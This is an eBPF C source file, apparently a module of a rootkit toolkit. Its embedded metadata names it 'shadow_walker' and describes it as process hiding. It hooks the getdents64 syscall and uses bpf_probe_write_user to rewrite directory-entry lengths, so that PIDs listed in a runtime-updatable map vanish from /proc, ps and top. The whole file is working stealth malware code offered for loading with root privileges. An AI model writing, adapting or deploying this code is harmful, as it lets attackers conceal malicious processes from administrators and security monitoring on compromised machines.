#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

char LICENSE[] SEC("license") = "GPL";

char _metadata[] __attribute__((used, section(".metadata"))) =
    "{"
      "\"name\":\"shadow_walker\","
      "\"desc\":\"进程隐藏：Hook getdents64 系统调用，使目标 PID 从 /proc 及 ps/top 消失\","
      "\"requires\":[\"is_root\",\"tracefs\",\"probe_write\"],"
      "\"options\":{},"
      "\"maps\":{"
        "\"hidden_pids\":{\"key_size\":4,\"value_size\":4,\"key_type\":\"u32\",\"value_type\":\"u32\"}"
      "}"
    "}";

/*
 * 要隐藏的 PID 集合（hash map）
 * 可在模块加载后通过 CMD_UPDATE 动态增删
 * update 格式：config[0:4]=PID(u32 LE), config[4:8]=1(u32 LE)
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 64);
    __type(key, u32);
    __type(value, u32);
} hidden_pids SEC(".maps");

/* 记录 getdents64 调用上下文 */
struct getdents_ctx {
    void *dirp;
    int   fd;
};
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 1024);
    __type(key, u64);
    __type(value, struct getdents_ctx);
} active_getdents SEC(".maps");

/* 字符串 → 整数（仅处理纯数字串） */
static __always_inline int str_to_int(const char *s, int len) {
    int result = 0;
    for (int i = 0; i < len && i < 8; i++) {
        if (s[i] < '0' || s[i] > '9') return -1;
        result = result * 10 + (s[i] - '0');
    }
    return result;
}

SEC("tp/syscalls/sys_enter_getdents64")
int handle_getdents64_enter(struct trace_event_raw_sys_enter *ctx) {
    u64 id = bpf_get_current_pid_tgid();
    struct getdents_ctx gctx = {};
    gctx.fd   = (int)ctx->args[0];
    gctx.dirp = (void *)ctx->args[1];
    bpf_map_update_elem(&active_getdents, &id, &gctx, BPF_ANY);
    return 0;
}

SEC("tp/syscalls/sys_exit_getdents64")
int handle_getdents64_exit(struct trace_event_raw_sys_exit *ctx) {
    u64 id = bpf_get_current_pid_tgid();
    struct getdents_ctx *gctx = bpf_map_lookup_elem(&active_getdents, &id);
    if (!gctx) return 0;

    int total = ctx->ret;
    void *dirp = gctx->dirp;
    bpf_map_delete_elem(&active_getdents, &id);

    if (total <= 0) return 0;

    int  offset      = 0;
    int  prev_offset = -1;
    unsigned short prev_reclen = 0;

    #pragma unroll
    for (int i = 0; i < 128; i++) {
        if (offset >= total) break;

        unsigned short d_reclen = 0;
        long err = bpf_probe_read_user(&d_reclen, sizeof(d_reclen),
            dirp + offset + offsetof(struct linux_dirent64, d_reclen));
        if (err != 0 || d_reclen == 0) break;

        char d_name[16] = {};
        bpf_probe_read_user_str(d_name, sizeof(d_name),
            dirp + offset + offsetof(struct linux_dirent64, d_name));

        int name_len = 0;
        for (int j = 0; j < 15; j++) {
            if (d_name[j] == '\0') break;
            name_len++;
        }

        if (name_len > 0 && name_len < 8) {
            int pid = str_to_int(d_name, name_len);
            if (pid > 0) {
                u32 pid_key = (u32)pid;
                if (bpf_map_lookup_elem(&hidden_pids, &pid_key)) {
                    if (prev_offset >= 0) {
                        unsigned short new_reclen = prev_reclen + d_reclen;
                        bpf_probe_write_user(
                            dirp + prev_offset + offsetof(struct linux_dirent64, d_reclen),
                            &new_reclen, sizeof(new_reclen));
                        bpf_printk("SHADOW_WALKER: PID %d hidden\n", pid);
                        prev_reclen = new_reclen;
                        offset += d_reclen;
                        continue;
                    }
                }
            }
        }
        prev_offset = offset;
        prev_reclen = d_reclen;
        offset += d_reclen;
    }
    return 0;
}
